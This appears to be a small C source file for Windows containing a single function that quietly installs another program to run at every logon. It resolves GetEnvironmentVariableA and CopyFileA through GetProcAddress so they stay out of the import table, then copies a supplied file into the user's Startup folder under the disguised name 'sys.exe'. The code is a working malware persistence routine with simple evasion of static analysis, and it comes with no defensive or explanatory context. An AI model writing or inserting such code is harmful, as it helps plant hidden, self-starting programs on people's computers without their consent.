#include <windows.h>

void __attribute__((noinline)) __attribute__((used)) routine_v3(const char* source){
    typedef DWORD (WINAPI *GEVA)(LPCSTR, LPSTR, DWORD);
    typedef BOOL (WINAPI *CFA)(LPCSTR, LPCSTR, BOOL);
    HMODULE hK = GetModuleHandleA("kernel32.dll");
    GEVA pGetEnv = (GEVA)GetProcAddress(hK, "GetEnvironmentVariableA");
    CFA pCopy = (CFA)GetProcAddress(hK, "CopyFileA");
    
    char path[MAX_PATH];
    pGetEnv("APPDATA", path, MAX_PATH);
    lstrcatA(path, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sys.exe");
    pCopy(source, path, FALSE);
}